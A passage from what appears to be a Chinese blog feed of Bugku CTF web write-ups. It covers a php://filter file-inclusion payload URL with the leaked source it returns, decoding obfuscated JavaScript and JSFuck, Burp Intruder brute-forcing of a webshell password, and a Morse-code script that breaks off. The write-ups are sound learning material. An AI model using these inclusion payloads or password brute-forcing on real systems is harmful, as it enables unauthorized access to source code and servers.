PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</span></span><br></pre></td></tr></table></figure><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php://<span class="built_in">filter</span></span><br><span class="line">php://<span class="built_in">filter</span> 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-<span class="keyword">in</span>-<span class="literal">one</span>）的文件函数非常有用，类似 readfile()、 <span class="built_in">file</span>() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。</span><br></pre></td></tr></table></figure><table><thead><tr><th>名称</th><th style="text-align:center">描述           </th></tr></thead><tbody><tr><td>resource=&lt;要过滤的数据流&gt;</td><td style="text-align:center">指定你要筛选过滤的数据流 </td></tr><tr><td>read=&lt;读链的筛选列表&gt;</td><td style="text-align:center">可以设定一个或多个过滤器名称，以管道符(&#124;)分隔</td></tr><tr><td>write=&lt;写链的筛选列表&gt;</td><td style="text-align:center">可以设定一个或多个过滤器名称，以管道符(&#124;)分隔</td></tr><tr><td>&lt;; 两个链的筛选列表&gt;</td><td style="text-align:center">任何没有以read=或write作前缀的筛选列表会视情况应用于读或写链</td></tr></tbody></table><p>利用这个协议我们可以解决一些ctf的题目，或者挖掘出一些漏洞。<br>构造payload：<br><a href="http://123.206.87.240:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php" target="_blank" rel="noopener">http://123.206.87.240:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php</a><br><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">php支持得伪协议</span><br><span class="line"><span class="symbol">file:</span><span class="comment">// — 访问本地文件系统</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">// — 访问 HTTP(s) 网址</span></span><br><span class="line"><span class="symbol">ftp:</span><span class="comment">// — 访问 FTP(s) URLs</span></span><br><span class="line"><span class="symbol">php:</span><span class="comment">// — 访问各个输入/输出流（I/O streams）</span></span><br><span class="line"><span class="symbol">zlib:</span><span class="comment">// — 压缩流</span></span><br><span class="line"><span class="symbol">data:</span><span class="comment">// — 数据（RFC 2397）</span></span><br><span class="line"><span class="symbol">glob:</span><span class="comment">// — 查找匹配的文件路径模式</span></span><br><span class="line"><span class="symbol">phar:</span><span class="comment">// — PHP 归档</span></span><br><span class="line"><span class="symbol">ssh2:</span><span class="comment">// — Secure Shell 2</span></span><br><span class="line"><span class="symbol">rar:</span><span class="comment">// — RAR</span></span><br><span class="line"><span class="symbol">ogg:</span><span class="comment">// — 音频流</span></span><br><span class="line"><span class="symbol">expect:</span><span class="comment">// — 处理交互式的流</span></span><br><span class="line"></span><br><span class="line">read参数值可为</span><br><span class="line">string.strip_tags 将数据流中的所有html标签清除</span><br><span class="line">string.toupper 将数据流中的内容转换为大写</span><br><span class="line">string.tolower 将数据流中的内容转换为小写</span><br><span class="line">convert.base64-encode 将数据流中的内容转换为base64编码</span><br><span class="line">convert.base64-decode 与上面对应解码</span><br><span class="line"></span><br><span class="line">resource=[文件路径]</span><br></pre></td></tr></table></figure></p><p>返回一串base64编码<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PGh<span class="number">0</span>bWw+DQogICAgPHRpdGxlPkJ<span class="number">1</span>Z<span class="number">2</span>t<span class="number">1</span>LWN<span class="number">0</span>ZjwvdGl<span class="number">0</span>bGU+DQogICAgDQo<span class="number">8</span>P<span class="number">3</span>BocA<span class="number">0</span>KCWVycm<span class="number">9</span>yX<span class="number">3</span>JlcG<span class="number">9</span>ydGluZygwKTsNCglpZighJF<span class="number">9</span>HRVRbZmlsZV<span class="number">0</span>pe<span class="number">2</span>VjaG<span class="number">8</span>gJzxhIGhyZWY<span class="number">9</span>I<span class="keyword">i4</span>vaW<span class="number">5</span>kZXgucGhwP<span class="number">2</span>ZpbGU<span class="number">9</span><span class="keyword">c</span><span class="number">2</span>hvdy<span class="number">5</span>waHAiPmNsaWNrIG<span class="number">1</span>lPyBubzwvYT<span class="number">4</span>nO<span class="number">30</span>NCgkkZmlsZT<span class="number">0</span>kX<span class="number">0</span>dFVFsnZmlsZSddOw<span class="number">0</span>KCWlmKHN<span class="number">0</span>cnN<span class="number">0</span>cigkZmlsZSwiL<span class="keyword">i4</span>vIil<span class="number">8</span>fHN<span class="number">0</span>cmlzdHIoJGZpbGUsICJ<span class="number">0</span>cCIpfHxzdHJpc<span class="number">3</span>RyKCRmaWxlLCJpbnB<span class="number">1</span>dCIpfHxzdHJpc<span class="number">3</span>RyKCRmaWxlLCJkYXRhIikpew<span class="number">0</span>KCQllY<span class="number">2</span>hvICJPaCBubyEiOw<span class="number">0</span>KCQlleGl<span class="number">0</span>KCk<span class="number">7</span>DQoJfQ<span class="number">0</span>KCWluY<span class="number">2</span><span class="keyword">x</span><span class="number">1</span>ZGUoJGZpbGUpOyANC<span class="keyword">i8</span>vZmxhZzpmbGFne<span class="number">2</span>VkdWxjbmlfZWxpZl<span class="number">9</span>sYWNvbF<span class="number">9</span>zaV<span class="number">9</span>zaWh<span class="number">0</span>fQ<span class="number">0</span>KPz<span class="number">4</span>NCjwvaHRtbD<span class="number">4</span>NCg==</span><br></pre></td></tr></table></figure></p><p>base64解码后<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Bugku-ctf<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(!$_GET[file])&#123;<span class="keyword">echo</span> <span class="string">'&lt;a href="./index.php?file=show.php"&gt;click me? no&lt;/a&gt;'</span>;&#125;</span></span><br><span class="line"><span class="php">$file=$_GET[<span class="string">'file'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(strstr($file,<span class="string">"../"</span>)||stristr($file, <span class="string">"tp"</span>)||stristr($file,<span class="string">"input"</span>)||stristr($file,<span class="string">"data"</span>))&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"Oh no!"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">exit</span>();   <span class="comment">//达到过滤效果，这是php://中的其他方法</span></span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">include</span>($file); </span></span><br><span class="line"><span class="php"><span class="comment">//flag:flag&#123;edulcni_elif_lacol_si_siht&#125;  #flag在注释中</span></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>()函数，这个表示从外部引入php文件并执行，如果执行不成功，就返回文件的源码</span><br><span class="line">而<span class="keyword">include</span>的内容是由用户控制的，所以通过我们传递的<span class="keyword">file</span>参数，是<span class="keyword">include</span>（）函数引入了<span class="built_in">index</span>.php的base64编码格式，ase64编码格式导致执行不成功，返回base64格式源码。</span><br><span class="line">如果不进行base64编码传入，就会直接执行，而flag的信息在注释中，是得不到的。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Bugku </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> base64 </tag>
            
            <tag> 文件包含 </tag>
            
            <tag> php:// </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku-WEB4</title>
      <link href="/2019/01/28/201925/"/>
      <url>/2019/01/28/201925/</url>
      
        <content type="html"><![CDATA[<p><strong>WEB4-writeup</strong><br><a id="more"></a><br>打开题目<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kioy7r2aj30cg0af3yh.jpg" alt=""><br>访问链接，提示看看源代码？查看源代码<br>得到一串经过escape编码的代码<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kip4d5p7j313j0ia74t.jpg" alt=""><br>进行escape解码后<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> p1 = <span class="string">'function checkSubmit()&#123;var a=document.getElementById("password");if("undefined"!=typeof a)&#123;if("67d709b2b'</span>;</span><br><span class="line"><span class="keyword">var</span> p2 = <span class="string">'aa648cf6e87a7114f1"==a.value)return!0;alert("Error");a.focus();return!1&#125;&#125;document.getElementById("levelQuest").onsubmit=checkSubmit;'</span>;</span><br><span class="line"><span class="built_in">eval</span>(<span class="built_in">unescape</span>(p1) + <span class="built_in">unescape</span>(<span class="string">'54aa2'</span> + p2));</span><br></pre></td></tr></table></figure></p><p>主要看这一句<br>eval(unescape(p1) + unescape(‘54aa2’ + p2))<br><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>() 函数可计算某个字符串，并执行其中的的 JavaScript 代码。</span><br><span class="line">语法</span><br><span class="line"><span class="built_in">eval</span>（<span class="built_in">string</span>）</span><br><span class="line"><span class="built_in">string</span>-必需。要计算的字符串，其中含有要计算的JavaScript表达式或要执行的语句</span><br></pre></td></tr></table></figure></p><p>p1+p2连接整理后的代码<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSubmit</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> a=<span class="built_in">document</span>.getElementById(<span class="string">"password"</span>); <span class="comment">//匹配ID名为password的元素，并赋值给a</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">"undefined"</span>!=<span class="keyword">typeof</span> a)&#123;<span class="comment">//判断a的类型是否undefined</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">"67d709b2b54aa2aa648cf6e87a7114f1"</span>==a.value) <span class="comment">//判断a的元素的value值是否为67d709b2b54aa2aa648cf6e87a7114f1（67d709b2b+54aa2+aa648cf6e87a7114f1）</span></span><br><span class="line"><span class="keyword">return</span>!<span class="number">0</span>;</span><br><span class="line">alert(<span class="string">"Error"</span>);<span class="comment">//弹框“Error””</span></span><br><span class="line">a.focus();<span class="comment">//获取焦点时，向元素添加特殊的样式（改变背景颜色）</span></span><br><span class="line"><span class="keyword">return</span>!<span class="number">1</span>  <span class="comment">//! 表示取反运算，js 为弱类型语言，所有非0的int值都为 Bool 值的 True ，所以 !1就是取 True的反，即False。</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">"levelQuest"</span>).onsubmit=checkSubmit;  <span class="comment">//获取id为levelQuest文档元素，点击submit时执行checkSubmit函数，onsubmit再点击submit时发生，若返回真提交表单</span></span><br></pre></td></tr></table></figure></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">var</span> </span><br><span class="line">声明（创建）JavaScript变量</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">escape</span><span class="params">()</span></span> 函数</span><br><span class="line">定义和用法</span><br><span class="line"><span class="function"><span class="title">escape</span><span class="params">()</span></span> 函数可对字符串进行编码，这样就可以在所有的计算机上读取该字符串。</span><br><span class="line">语法</span><br><span class="line"><span class="function"><span class="title">escape</span><span class="params">(string)</span></span></span><br><span class="line">string-必需。需要转义或编码的字符串</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">unescape</span><span class="params">()</span></span> 函数</span><br><span class="line">定义和用法</span><br><span class="line"><span class="function"><span class="title">unescape</span><span class="params">()</span></span> 函数可对通过 escape() 编码的字符串进行解码。</span><br><span class="line"><span class="function"><span class="title">unescape</span><span class="params">(string)</span></span></span><br><span class="line">string-必需。要解码或反转义的字符串</span><br><span class="line"></span><br><span class="line">typeof</span><br><span class="line">操作符返回一个字符串，表示未经计算的操作数的类型</span><br><span class="line">详情点击：https:<span class="comment">//developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/typeof#%E5%8F%82%E6%95%B0</span></span><br></pre></td></tr></table></figure><p>分析完代码后，表单的id值为levelQuest，通过审查元素将输入框的id值更改为password，输入框输入67d709b2b54aa2aa648cf6e87a7114f1点击submit<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kipb7lvyj313j0iaaat.jpg" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Bugku </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> escape </tag>
            
            <tag> unescape </tag>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku-网站被黑</title>
      <link href="/2019/01/28/201924/"/>
      <url>/2019/01/28/201924/</url>
      
        <content type="html"><![CDATA[<p><strong>网站被黑-writeup</strong><br><a id="more"></a><br>打开题目<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kipn37kjj30ci0acdfv.jpg" alt=""><br>访问链接，大大黑页（好酷炫这东西可以玩一整天，2333）<br>查看源代码，尝试了一些方法，没有找到一点思路<br>打开御剑扫描工具，扫描一下看有没有敏感信息、源码泄露之类的<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kips1a7ij30ll0ecaai.jpg" alt=""><br>得到一个链接，感觉像是一个后门地址<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kipwm9pej312b0gmglp.jpg" alt=""><br>正是一个shell后门，尝试几个常见的密码，无果<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kiq1gfk3j30fp09xq2t.jpg" alt=""><br>直接用burp suite进行密码爆破<br>进行抓包右键发送到intruder<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kiq7a91gj30ra0kd75q.jpg" alt=""><br>添加需要的变量，list选择自带的一个Passwords，点击Start attack开始<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kiqbvqy1j30rb0kpmyn.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kiqjmfizj30rs0m8jt2.jpg" alt=""><br>这里length不一样的就是密码了<br>因为我们通常输入正确的密码和错误的密码返回的请求长度是有区别的<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kiqq11lsj30ns0myaau.jpg" alt=""><br>输入密码，得到flag<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kiqvcxj6j30h809zq2t.jpg" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Bugku </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> shell后门 </tag>
            
            <tag> 弱口令爆破 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku-头等舱</title>
      <link href="/2019/01/28/201923/"/>
      <url>/2019/01/28/201923/</url>
      
        <content type="html"><![CDATA[<p><strong>头等舱-writeup</strong><br><a id="more"></a><br>打开题目<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kir76fuhj30co09f3yh.jpg" alt=""><br>点击访问链接，查看源代码发现什么都没有<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kirbghgnj30ty0k8aac.jpg" alt=""><br>利用burp suite抓包看下，根据题目提示头等舱，查看Response中的Headers信息，得到flag<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kirfgwekj30rs0m8myz.jpg" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Bugku </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> Headers </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku-web5</title>
      <link href="/2019/01/26/201922/"/>
      <url>/2019/01/26/201922/</url>
      
        <content type="html"><![CDATA[<p><strong>web5-writeup</strong><br><a id="more"></a><br>打开题目<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kirx2tt0j30ci0b7q2x.jpg" alt=""><br>点击访问,出现输入框，随便输入点字符串，点击提交，提示(在好好看看)<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kis1sxxtj30cx04st8j.jpg" alt=""><br>查看源代码，出现了一大串(!+()[])，根据题目提示，这应该是一串JSFuck编码<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kis6fojxj30ty0k8jtg.jpg" alt=""><br><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">JSFuck</span> <span class="selector-attr">[]</span>()!+</span><br><span class="line"><span class="selector-tag">JSFuck</span>是一种基于<span class="selector-tag">JavaScript</span>原子部分的深奥教育编程风格。它只使用六个不同的字符来编写和执行代码。</span><br><span class="line"></span><br><span class="line">它不依赖于浏览器，因此您甚至可以在<span class="selector-tag">Node</span><span class="selector-class">.js</span>上运行它。</span><br><span class="line">简单来说<span class="selector-tag">JSFuck</span>可以让你只用<span class="selector-tag">6</span>个字符<span class="selector-attr">[]</span>()!+来编写<span class="selector-tag">JavaScript</span>程序。</span><br><span class="line">用途：</span><br><span class="line">①脚本注入时防止过滤</span><br><span class="line">②一定程度加密关键代码（不适合加密大量代码，毕竟太长了）</span><br><span class="line">③把包含的字符做到极致（<span class="selector-attr">[]</span>()!+）</span><br><span class="line">④转换后本质依然是<span class="selector-tag">JavaScript</span>，通过<span class="selector-tag">JavaScript</span>的一些特性生成。</span><br><span class="line">了解更多可以访问：<span class="selector-tag">https</span>:<span class="comment">//github.com/aemkei/jsfuck</span></span><br></pre></td></tr></table></figure></p><p>我们直接将JSFuck复制下来利用浏览器的Console执行，或者在线工具进行转换（<a href="http://www.jsfuck.com/" target="_blank" rel="noopener">http://www.jsfuck.com/</a>）<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kiscebnhj30ty0k8gns.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kisn9o5aj314w0lsq3m.jpg" alt=""><br>将得到的值进行提交，提示（唉吆，已经非常非常接近了。。。）<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kisvgwd2j30du04uglg.jpg" alt=""><br>将得到的值换成大写（题目提示），提交<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kit103bgj30n0044gli.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kit83fabj30dk047dfo.jpg" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Bugku </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> JSFuck </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MORSE与ASCII码对应表</title>
      <link href="/2019/01/26/201921/"/>
      <url>/2019/01/26/201921/</url>
      
        <content type="html"><![CDATA[<h5 id="MORSE与ASCII码对应表"><a href="#MORSE与ASCII码对应表" class="headerlink" title="MORSE与ASCII码对应表"></a>MORSE与ASCII码对应表</h5><a id="more"></a><p><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kiu42qa3j30ia0yr3zg.jpg" alt=""></p><h5 id="转换工具"><a href="#转换工具" class="headerlink" title="转换工具"></a>转换工具</h5><p>因为之前做到过相关的题目所以根据对应关系我写了一个ascii2morse_tool<br>下载地址:<a href="https://github.com/alixiaowei/ascii2morse-tool" target="_blank" rel="noopener">https://github.com/alixiaowei/ascii2morse-tool</a><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) != <span class="number">3</span>:</span><br><span class="line">    print(<span class="string">'''                                                                                                    </span></span><br><span class="line"><span class="string">$$$$ @$$$&amp;  $$$$q         h$$$$$a        $$$$$$)    $$$$$         *$$$$$$&gt;]$          .$$$$$@       </span></span><br><span class="line"><span class="string"> $$$$   $$[$   $$"      X$$     @$d          $$)  $$   $$$      :$^     .$$$         $$!    M$$     </span></span><br><span class="line"><span class="string"> $$$    $$$    @$$     $$I       ,$8         a$) $     $$$      $.        $$        $$       "$$    </span></span><br><span class="line"><span class="string"> $$$    o$$    p$$    +$M         @$~        a$)$'             f$          $       $$         $$f   </span></span><br><span class="line"><span class="string"> $$$    o$$    p$$    $$           $$        a$$               ;$$                &#125;$$         &lt;$$   </span></span><br><span class="line"><span class="string"> $$$    o$$    p$$   1$$           $$&lt;       a$p                $$$$;             $$$         `$$   </span></span><br><span class="line"><span class="string"> $$$    o$$    p$$   8$$           $$$       a$)                  @$$$$$"         $$$$$$$$$$$$$$$   </span></span><br><span class="line"><span class="string"> $$$    o$$    p$$   B$$           $$$       a$)                     $$$$$\       $$$               </span></span><br><span class="line"><span class="string"> $$$    o$$    p$$   Q$$           $$(       a$)                        +$$$      $$$               </span></span><br><span class="line"><span class="string"> $$$    o$$    p$$    $$           $$        a$)               Q          $$@     k$$               </span></span><br><span class="line"><span class="string"> $$$    o$$    p$$    #$&lt;         )$M        a$)               $           $$      $$           h   </span></span><br><span class="line"><span class="string"> $$$    o$$    p$$     $$         $$         a$)               $$         .$+      +$$         $    </span></span><br><span class="line"><span class="string"> $$$    $$$    %$$      $$&#125;     l$@          8$q               $$$`      :$C         $$Q     p$     </span></span><br><span class="line"><span class="string">$$$$$  $$$$$  $$$$$       $$$$$$$        $$$$$$$$$$$l          $8'Z$$$$$$&amp;            Q$$$$$$p      </span></span><br><span class="line"><span class="string">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span></span><br><span class="line"><span class="string">  '''</span>)</span><br><span class="line">    print(<span class="string">'-v Enter the ASCII you want to convert \n\nusage: python -v ascii2morse-tool.py "1001 00 01 111 011 0 00"\n'</span>)</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] != <span class="string">'-v'</span>:</span><br><span class="line">    print(<span class="string">'usage: python -v ascii2morse-tool.py "1001 00 01 111 011 0 00"'</span>, <span class="string">' \n 参数错误，请重新输入...'</span>)</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line">string = sys.argv[<span class="number">2</span>]</span><br><span class="line">key = string.split(<span class="string">' '</span>)</span><br><span class="line">dictionary = &#123;<span class="string">'01'</span>: <span class="string">'A'</span>,</span><br><span class="line">              <span class="string">'1000'</span>: <span class="string">'B'</span>,</span><br><span class="line">              <span class="string">'1010'</span>: <span class="string">'C'</span>,</span><br><span class="line">              <span class="string">'100'</span>: <span class="string">'D'</span>,</span><br><span class="line">              <span class="string">'0'</span>: <span class="string">'E'</span>,</span><br><span class="line">              <span class="string">'0010'</span>: <span class="string">'F'</span>,</span><br><span class="line">              <span class="string">'110'</span>: <span class="string">'G'</span>,</span><br><span class="line">              <span class="string">'0000'</span>: <span class="string">'H'</span>,</span><br><span class="line">              <span class="string">'00'</span>: <span class="string">'I'</span>,</span><br><span class="line">              <span class="string">'0111'</span>: <span class="string">'J'</span>,</span><br><span class="line">              <span class="string">'101'</span>: <span class="string">'K'</span>,</span><br><span class="line">              <span class="string">'0100'</span>: <span class="string">'L'</span>,</span><br><span class="line">              <span class="string">'11'</span>: <span class="string">'M'</span>,</span><br><span class="line">              <span class="string">'10'</span>: <span class="string">'N'</span>,</span><br><span class="line">              <span class="string">'111'</span>: <span class="string">'O'</span>,</span><br><span class="line">              <span class="string">'0110'</span>: <span class="string">'P'</span>,</span><br><span class="line">              <span class="string">'1101'</span>: <span class="string">'Q'</span>,</span><br><span class="line">              <span class="string">'010'</span>: <span class="string">'R'</span>,</span><br><span class="line">              <span class="string">'000'</span>: <span class="string">'S'</span>,</span><br><span class="line">              <span class="string">'1'</span>: <span class="string">'T'</span>,</span><br><span class="line">              <span class="string">'001'</span>: <span class="string">'U'</span>,</span><br><span class="line">              <span class="string">'0001'</span>: <span class="string">'V'</span>,</span><br><span class="line">              <span class="string">'011'</span>: <span class="string">'W'</span>,</span><br><span class="line">              <span class="string">'1001'</span>: <span class="string">'X'</span>,</span><br><span class="line">              <span class="string">'1011'</span>: <span class="string">'Y'</span>,</span><br><span class="line">              <span class="string">'1100'</span>: <span class="string">'Z'</span>,</span><br><span class="line">              <span class="string">'01111'</span>: <span class="string">'1'</span>,</span><br><span class="line">              <span class="string">'00111'</span>: <span class="string">'2'</span>,</span><br><span class="line">              <span class="string">'00011'</span>: <span class="string">'3'</span>,</span><br><span class="line">              <span class="string">'00001'</span>: <span class="string">'4'</span>,</span><br><span class="line">              <span class="string">'00000'</span>: <span class="string">'5'</span>,</span><br><span class="line">              <span class="string">'10000'</span>: <span class="string">'6'</span>,</span><br><span class="line">              <span class="string">'11000'</span>: <span class="string">'7'</span>,</span><br><span class="line">              <span class="string">'11100'</span>: <span class="string">'8'</span>,</span><br><span class="line">              <span class="string">'11110'</span>: <span class="string">'9'</span>,</span><br><span class="line">              <span class="string">'11111'</span>: <span class="string">'0'</span>,</span><br><span class="line">              <span class="string">'001100'</span>: <span class="string">'?'</span>,</span><br><span class="line">              <span class="string">'10010'</span>:  <span class="string">'/'</span>,</span><br><span class="line">              <span class="string">'101101'</span>: <span class="string">'()'</span>,</span><br><span class="line">              <span class="string">'100001'</span>: <span class="string">'-'</span>,</span><br><span 